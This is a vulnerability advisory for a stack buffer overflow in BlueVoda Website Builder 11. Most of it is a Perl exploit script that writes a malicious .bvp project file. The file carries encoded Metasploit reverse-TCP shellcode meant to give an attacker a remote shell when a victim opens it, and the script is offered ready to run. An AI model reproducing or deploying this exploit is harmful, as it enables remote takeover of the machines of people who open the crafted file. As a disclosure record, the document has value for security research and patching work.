source: http://www.securityfocus.com/bid/47753/info

BlueVoda Website Builder is prone to a stack-based buffer-overflow vulnerability because the application fails to properly bounds-check user-supplied data before copying it into an insufficiently sized buffer.

An attacker could exploit this issue to execute arbitrary code in the context of the affected application. Failed exploit attempts will likely result in denial-of-service conditions.

BlueVoda Website Builder 11 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl
system("cls");
sub logo(){
print q'
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
1                      ______                                          0
0                   .-"      "-.                                       1
1                  / KedAns-Dz  \ =-=-=-=-=-=-=-=-=-=-=-|              0
0 Algerian HaCker |              | > Site : 1337day.com |              1
1 --------------- |,  .-.  .-.  ,| > Twitter : @kedans  |              0
0                 | )(_o/  \o_)( | > ked-h@hotmail.com  |              1
1                 |/     /\     \| =-=-=-=-=-=-=-=-=-=-=|              0
0       (@_       (_     ^^     _)  HaCkerS-StreeT-Team                1
1  _     ) \_______\__|IIIIII|__/_______________________               0
0 (_)@8@8{}<________|-\IIIIII/-|________________________>              1
1        )_/        \          /                                       0
0       (@           `--------` . 2011, Inj3ct0r Team                  1
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-0
0     BlueVoda Website Builder v.11 (.bvp) Stack Buffer Overflow       1
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-0
';
}
# ---------
# BlueVoda Website Builder v.11 (.bvp) Stack Buffer Overflow
# Author : KedAns-Dz <ked-h@hotmail.com || ked-h@exploit-id.com>
# special thanks to : Inj3ct0r Team + Exploit-Id Team
# Tested in Windows XP sp3 France
# ---------
logo();
my $header = # BlueVoda Project (bvp) Header
"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1\x00\x00\x00\x00\x00\x00\x00\x00".
"\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x00\x03\x00\xfe\xff\x09";
my $jump = "\xeb\x02\x90\x90" ; # short jump - from BlueVoda.exe
my $call = "\xff\x52\x7c"; # Call - from BlueVoda.exe
my $junk = "\x41" x 321; # Buffer
my $nops = "\x90" x 51; # Nopsled
# windows/shell_reverse_tcp - 340 bytes (http://www.metasploit.com)
# LHOST=127.0.0.1, LPORT=4444, Encoder: x86/call4_dword_xor
my $shell = 
"\x29\xc9\x83\xe9\xb1\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76" .
"\x0e\x4e\x5a\xfa\xc3\x83\xee\xfc\xe2\xf4\xb2\xb2\x73\xc3" .
"\x4e\x5a\x9a\x4a\xab\x6b\x28\xa7\xc5\x08\xca\x48\x1c\x56" .
"\x71\x91\x5a\xd1\x88\xeb\x41\xed\xb0\xe5\x7f\xa5\xcb\x03" .
"\xe2\x66\x9b\xbf\x4c\x76\xda\x02\x81\x57\xfb\x04\xac\xaa" .
"\xa8\x94\xc5\x08\xea\x48\x0c\x66\xfb\x13\xc5\x1a\x82\x46" .
"\x8e\x2e\xb0\xc2\x9e\x0a\x71\x8b\x56\xd1\xa2\xe3\x4f\x89" .
"\x19\xff\x07\xd1\xce\x48\x4f\x8c\xcb\x3c\x7f\x9a\x56\x02" .
"\x81\x57\xfb\x04\x76\xba\x8f\x37\x4d\x27\x02\xf8\x33\x7e" .
"\x8f\x21\x16\xd1\xa2\xe7\x4f\x89\x9c\x48\x42\x11\x71\x9b" .
"\x52\x5b\x29\x48\x4a\xd1\xfb\x13\xc7\x1e\xde\xe7\x15\x01" .
"\x9b\x9a\x14\x0b\x05\x23\x16\x05\xa0\x48\x5c\xb1\x7c\x9e" .
"\x26\x69\xc8\xc3\x4e\x32\x8d\xb0\x7c\x05\xae\xab\x02\x2d" .
"\xdc\xc4\xb1\x8f\x42\x53\x4f\x5a\xfa\xea\x8a\x0e\xaa\xab" .
"\x67\xda\x91\xc3\xb1\x8f\xaa\x93\x1e\x0a\xba\x93\x0e\x0a" .
"\x92\x29\x41\x85\x1a\x3c\x9b\xd3\x3d\xab\x31\x5a\xfa\xc2" .
"\x26\x58\xfa\xd2\x12\xd3\x1c\xa9\x5e\x0c\xad\xab\xd7\xff" .
"\x8e\xa2\xb1\x8f\x92\xa0\x23\x3e\xfa\x4a\xad\x0d\xad\x94" .
"\x7f\xac\x90\xd1\x17\x0c\x18\x3e\x28\x9d\xbe\xe7\x72\x5b" .
"\xfb\x4e\x0a\x7e\xea\x05\x4e\x1e\xae\x93\x18\x0c\xac\x85" .
"\x18\x14\xac\x95\x1d\x0c\x92\xba\x82\x65\x7c\x3c\x9b\xd3" .
"\x1a\x8d\x18\x1c\x05\xf3\x26\x52\x7d\xde\x2e\xa5\x2f\x78" .
"\xbe\xef\x58\x95\x26\xfc\x6f\x7e\xd3\xa5\x2f\xff\x48\x26" .
"\xf0\x43\xb5\xba\x8f\xc6\xf5\x1d\xe9\xb1\x21\x30\xfa\x90" .
"\xb1\x8f\xfa\xc3";
my $exploit = $header.$jump.$junk.$call.$shell.$nops; 
open(myfile,'>>KedAns.bvp');
print myfile $exploit;
close (myfile);

